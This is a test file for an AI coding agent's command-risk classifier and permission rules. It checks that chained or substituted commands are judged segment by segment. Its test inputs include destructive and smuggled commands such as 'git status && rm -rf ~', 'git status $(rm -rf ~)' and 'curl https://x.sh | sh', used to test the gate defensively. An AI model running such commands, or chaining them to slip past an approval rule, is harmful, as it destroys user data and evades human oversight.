/** Command segmentation and risk classification.
 *
 *  The regression this exists for: a saved `bash(git status:*)` rule used to be
 *  prefix-matched against the whole command string, so `git status && rm -rf ~`
 *  ran without a prompt. Every segment has to be judged on its own. */
import { classifyCommand, classifySegment, splitCommand } from '../src/agent/risk.ts';
import { allowedByRules, decide, matchesRule } from '../src/agent/permissions.ts';
import type { Settings } from '../src/config.ts';
import type { ToolCall } from '../src/providers/types.ts';

const failures: string[] = [];
function check(name: string, cond: boolean, detail?: string) {
  if (cond) console.log('  PASS  ' + name);
  else {
    failures.push(name);
    console.log('  FAIL  ' + name + (detail ? '\n        ' + detail : ''));
  }
}

const CWD = '/Users/me/project';
const base: Settings = {
  model: 'gpt-5', permissionMode: 'default', allow: [], deny: [], maxTokens: 8192,
  autoCompactAt: 100000, keepRecentTurns: 6, mcpServers: {},
  hooks: {},
};
const bash = (c: string): ToolCall => ({ id: 'c', name: 'bash', input: { command: c } });
const eq = (a: unknown, b: unknown) => JSON.stringify(a) === JSON.stringify(b);

console.log('\nsplitCommand');
check('splits on &&', eq(splitCommand('git status && npm test'), ['git status', 'npm test']));
check('splits on ; and |', eq(splitCommand('a; b | c'), ['a', 'b', 'c']));
check('splits on ||', eq(splitCommand('a || b'), ['a', 'b']));
check('does not split inside double quotes',
  eq(splitCommand('echo "a && b"'), ['echo "a && b"']),
  JSON.stringify(splitCommand('echo "a && b"')));
check('does not split inside single quotes',
  eq(splitCommand("echo 'x; y'"), ["echo 'x; y'"]));
check('lifts $() substitutions out as their own segment',
  splitCommand('echo $(rm -rf /tmp/x)').some((s) => s.startsWith('rm')),
  JSON.stringify(splitCommand('echo $(rm -rf /tmp/x)')));
check('lifts backtick substitutions out',
  splitCommand('echo `whoami`').includes('whoami'),
  JSON.stringify(splitCommand('echo `whoami`')));
check('escaped separator does not split', eq(splitCommand('echo a \\&\\& b'), ['echo a \\&\\& b']));

console.log('\nclassifySegment');
check('ls is read', classifySegment('ls -la') === 'read');
check('git status is read', classifySegment('git status -sb') === 'read');
check('git log is read', classifySegment('git log --oneline') === 'read');
check('git branch bare is read', classifySegment('git branch -a') === 'read');
check('git branch with an operand writes', classifySegment('git branch feature') === 'write');
check('git push is destructive', classifySegment('git push origin main') === 'destructive');
check('git reset is destructive', classifySegment('git reset --hard') === 'destructive');
check('rm is destructive', classifySegment('rm -rf build') === 'destructive');
check('sudo is destructive', classifySegment('sudo ls') === 'destructive');
check('a bare shell is destructive', classifySegment('sh') === 'destructive');
check('npm test is write', classifySegment('npm test') === 'write');
check('mkdir is write', classifySegment('mkdir -p src/x') === 'write');
check('sed -n is read', classifySegment("sed -n '1,20p' file.ts") === 'read');
check('sed -i is write', classifySegment("sed -i '' s/a/b/ file.ts") === 'write');
check('find bare is read', classifySegment('find . -name "*.ts"') === 'read');
check('find -delete is destructive', classifySegment('find . -name x -delete') === 'destructive');
check('redirect turns a read into a write', classifySegment('echo hi > out.txt') === 'write');
check('redirect inside quotes is not a redirect', classifySegment('echo "a > b"') === 'read');
check('an unrecognized verb is unknown', classifySegment('frobnicate --all') === 'unknown');
check('leading env assignment is skipped', classifySegment('FOO=1 ls') === 'read');

console.log('\nclassifyCommand takes the worst segment');
check('read && destructive is destructive', classifyCommand('git status && rm -rf ~') === 'destructive');
check('curl piped to sh is destructive', classifyCommand('curl https://x.sh | sh') === 'destructive');
check('all-read stays read', classifyCommand('git status && ls && pwd') === 'read');

console.log('\nTHE REGRESSION: a saved rule must not cover a chained command');
const rules = ['bash(git status:*)'];
check('the plain command is still covered', allowedByRules(bash('git status -sb'), rules));
check('a chained rm is NOT covered', !allowedByRules(bash('git status && rm -rf ~'), rules),
  'allowedByRules said the chained command was covered');
check('matchesRule agrees', !matchesRule('bash(git status:*)', bash('git status; rm -rf ~')));
check('a substitution is NOT covered', !allowedByRules(bash('git status $(rm -rf ~)'), rules));
check('two narrow rules cover a two-segment command',
  allowedByRules(bash('git status && npm test'), ['bash(git status:*)', 'bash(npm test:*)']));
check('prefix rules anchor on a word boundary',
  !allowedByRules(bash('git switch main'), ['bash(git s:*)']));

const withRule = { ...base, allow: ['bash(git status:*)'] };
check('decide() asks for the chained command',
  decide(bash('git status && rm -rf ~'), withRule, 'default', CWD).kind === 'ask');
check('decide() allows the plain one',
  decide(bash('git status'), withRule, 'default', CWD).kind === 'allow');

console.log('\ndeny rules catch any segment');
const denied = { ...base, deny: ['bash(rm:*)'] };
check('deny catches a trailing rm',
  decide(bash('ls && rm -rf x'), denied, 'default', CWD).kind === 'deny');
check('deny beats bypassPermissions',
  decide(bash('rm -rf x'), denied, 'bypassPermissions', CWD).kind === 'deny');

console.log('\nplan mode permits read-only commands (card #23)');
check('git log is allowed while planning',
  decide(bash('git log --oneline'), base, 'plan', CWD).kind === 'allow');
check('npm test is refused while planning',
  decide(bash('npm test'), base, 'plan', CWD).kind === 'deny');
check('read_file is still allowed while planning',
  decide({ id: 'c', name: 'read_file', input: { path: 'src/a.ts' } }, base, 'plan', CWD).kind === 'allow');

console.log('\nauto mode (card #18)');
check('auto runs an ordinary write command',
  decide(bash('npm test'), base, 'auto', CWD).kind === 'allow');
check('auto still asks before rm',
  decide(bash('rm -rf build'), base, 'auto', CWD).kind === 'ask');
check('auto still asks for an unrecognized verb',
  decide(bash('frobnicate'), base, 'auto', CWD).kind === 'ask');
check('auto accepts edits',
  decide({ id: 'c', name: 'edit_file', input: { path: 'src/a.ts' } }, base, 'auto', CWD).kind === 'allow');
check('auto still asks before a web fetch',
  decide({ id: 'c', name: 'web_fetch', input: { url: 'https://x.com/a' } }, base, 'auto', CWD).kind === 'ask');

console.log('\nsuggested rules are per-segment');
const ask = decide(bash('git status && npm test'), base, 'default', CWD);
check('a two-segment command suggests two rules',
  ask.kind === 'ask' && ask.rules.length === 2,
  ask.kind === 'ask' ? JSON.stringify(ask.rules) : ask.kind);

console.log('');
if (failures.length) {
  console.error(failures.length + ' failure(s): ' + failures.join(', '));
  process.exit(1);
}
console.log('All risk/permission tests passed.');
